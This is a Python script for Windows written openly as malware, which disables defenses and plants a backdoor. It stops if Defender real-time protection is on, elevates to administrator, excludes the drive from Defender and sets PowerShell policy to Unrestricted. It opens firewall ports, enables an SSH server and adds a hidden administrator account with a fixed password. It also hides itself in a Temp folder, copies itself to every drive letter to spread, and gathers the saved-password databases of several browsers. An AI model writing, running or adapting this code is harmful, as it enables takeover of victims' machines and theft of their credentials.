#!/usr/bin/env python3

import sys
import pathlib
import ctypes
from os import name
from os import mkdir
from os import system
from os import chdir
from sys import exit
from subprocess import run
from shutil import copy
from shutil import move
from re import search
from time import sleep

#                                                                        EEEEEEEEEEE      X     X     EEEEEEEEEEE  
# ||0@#@         .O0O0.       .O0O0.         X         A                 D                 X   X      D 
# ||    X       0      O     0      O       X  X      Z Q                D                  X X       D
# ||     @      O      0     O      0      X    F    F   A               DXXXXXXXXX          X        DFFFFFFFFFF
# ||      @     0      O     0      O     F      B  X     K              D                  X X       D
# ||      @     O      0     0      0    X       X X       K      @@     D                 X   X      D
# ||     O       .O0O0.       .0O0O.    M         X         Z     @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
# ||#@@@"

if name != "nt":  # _Checks_If_Operating_System_Is_Windows_And_Exits_If_Not
    exit()

win_av = run('powershell.exe Get-MpComputerStatus', shell=True, capture_output=True).stdout.decode()
if search("RealTimeProtectionEnabled        : True", win_av):
    ctypes.windll.user32.MessageBoxW(0, "Real Time Protection Must Be Disabled For Install", "Error", 1)
    exit()
else:  # _Checks_If_Windows_Anti-Virus_Real_Time_Protection_Is_Enabled_And_Requires_It_To_Be_Off
    print("SUCCESS")
sleep(0.1)


def is_usr_admin():  # _Checks_If_Script_Has_Admin_Privs
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("ERROR")
        ctypes.windll.shell32.ShellExecuteW(
            None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
        exit(0)
    else:
        sleep(0.1)


is_usr_admin()

current_user = os.getenv('username') #_Fill_These_Variable_To_Suit_Your_Needs

mal_file = "($cript!).exe"  # _NAME_OF_THE_SCRIPT_MUST_GO_HERE_!!!

name_of_opened_ports = "VIRUS"  #_Name_Of_The_Open_Port_Rule

ports_you_want_to_open = "80,22" #_Port_Numbers_Must_Be_Seperated_By_Commas

current_drive_letter = pathlib.Path.home().drive

def shell_commands():
    run('powershell.exe Add-MpPreference -ExclusionPath ' + current_drive_letter + '', shell=True)
    sleep(0.1)
    run('powershell.exe Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine -Force',
                   shell=True)
    sleep(0.1)
    run(
        'powershell.exe New-NetFirewallRule -DisplayName ' + name_of_opened_ports + ' -Direction inbound -Profile Any -Action Allow -LocalPort ' + ports_you_want_to_open + ' -Protocol TCP',
        shell=True)
    sleep(0.1)
    run(
        'powershell.exe New-NetFirewallRule -DisplayName ' + name_of_opened_ports + ' -Direction outbound -Profile Any -Action Allow -LocalPort ' + ports_you_want_to_open + ' -Protocol TCP',
        shell=True)
    sleep(0.1)
    run("powershell.exe Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0", shell=True)
    sleep(0.1)
    run("powershell.exe Set-Service -Name sshd -StartupType 'Automatic'", shell=True)
    sleep(0.1)
    run("powershell.exe Start-Service sshd", shell=True)
    sleep(0.1)


shell_commands()


def create_new_usr():  # _Adds_A_New_Administrator_To_The_System
    ssh_username = "defaultuser" #_Change_These_SSH_Login_Variables_To_Your_Desired_Credentials
    ssh_passwds = "PassW0rd1@"
    command = """
    $nusnm = """ + '"{}"'.format(ssh_username) + """
    $nuspss = ConvertTo-SecureString """ + '"{}"'.format(ssh_passwds) + """ -AsPlainText -Force
    New-LocalUser -Name $nusnm -Password $nuspss
    Add-LocalGroupMember -Group "Administrators" -Member $nusnm
    Get-LocalUser
    """
    print(command)
    exec = run(["powershell", "& {" + command + "}"])
    sleep(0.1)


create_new_usr()


def persistence():
    if os.path.exists("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923") >= True:
        print("Nice_Already_Got_Me_A_Seat")
    else:
        try:
            mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
        except:
            print("Error")
    sleep(1)
    system("attrib +h C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    sleep(0.1)
    #-Possible_Memory_Errors_With_Moving_File
    try:
        move(mal_file, "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\" + mal_file + "")
    except:
        print("Error")
    sleep(0.1)
    chdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923")
    

persistence()



def drive_drop():  # _Copys_File_To_All_Connected_Drives's_To_Spread
    try:
        copy("" + mal_file + "", "A://" + mal_file + "")
    except:
        print('NO_A_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "B://" + mal_file + "")
    except:
        print('NO_B_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "C://" + mal_file + "")
    except:
        print('NO_C_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "D://" + mal_file + "")
    except:
        print('NO_D_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "E://" + mal_file + "")
    except:
        print('NO_E_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "F://" + mal_file + "")
    except:
        print('NO_F_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "G://" + mal_file + "")
    except:
        print('NO_G_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "H://" + mal_file + "")
    except:
        print('NO_H_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "I://" + mal_file + "")
    except:
        print('NO_I_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "J://" + mal_file + "")
    except:
        print('NO_J_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "K://" + mal_file + "")
    except:
        print('NO_K_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "L://" + mal_file + "")
    except:
        print('NO_L_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "M://" + mal_file + "")
    except:
        print('NO_M_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "N://" + mal_file + "")
    except:
        print('NO_N_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "O://" + mal_file + "")
    except:
        print('NO_O_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "P://" + mal_file + "")
    except:
        print('NO_P_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Q://" + mal_file + "")
    except:
        print('NO_Q_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "R://" + mal_file + "")
    except:
        print('NO_R_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "S://" + mal_file + "")
    except:
        print('NO_S_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "T://" + mal_file + "")
    except:
        print('NO_T_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "U://" + mal_file + "")
    except:
        print('NO_U_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "V://" + mal_file + "")
    except:
        print('NO_V_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "W://" + mal_file + "")
    except:
        print('NO_W_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "X://" + mal_file + "")
    except:
        print('NO_X_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Y://" + mal_file + "")
    except:
        print('NO_Y_DRIVE')
    sleep(0.1)
    try:
        copy("" + mal_file + "", "Z://" + mal_file + "")
    except:
        print('NO_Z_DRIVE')
    sleep(0.1)


drive_drop()


def temp_hq_prep():  # _Organising_Temp_Folder_For_Passwords_And_Decryption
    try:
        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
    except:
        print("Error")
    sleep(0.1)
    try:
        mkdir("C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
    except:
        print("Error")
    sleep(0.1)


temp_hq_prep()


def passwd_grabr():  # _Grabs_Login_Data_Files_Prepping_For_Decryption
    try:
        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\chromepwds")
    except:
        print("ERROR")
        sleep(0.1)
    try:
        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\edgepwds")
    except:
        print("ERROR")
        sleep(0.1)
    try:
        copy(
            " C:\\Users\\" + current_user + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
            "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\bravepwds")
    except:
        print("ERROR")
        sleep(0.1)
    try:
        copy("C:\\Users\\" + current_user + "\\AppData\Roaming\\Opera Software\\Opera Stable\\Login Data",
                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operapwds")
    except:
        print("ERROR")
        sleep(0.1)
    try:
        copy("C:\\Users\\" + current_user + "\\AppData\\Local\\Opera Software\\Opera GX Stable\\Login Data",
                    "C:\\Users\\" + current_user + "\\AppData\\Local\\Temp\\tmp_0x234692367923\\operagxpwds")
    except:
        print("ERROR")
        sleep(0.1)


passwd_grabr()

ctypes.windll.user32.MessageBoxW(0, "Script_Excecuted_Without_Error", "SUCCESS", 1)
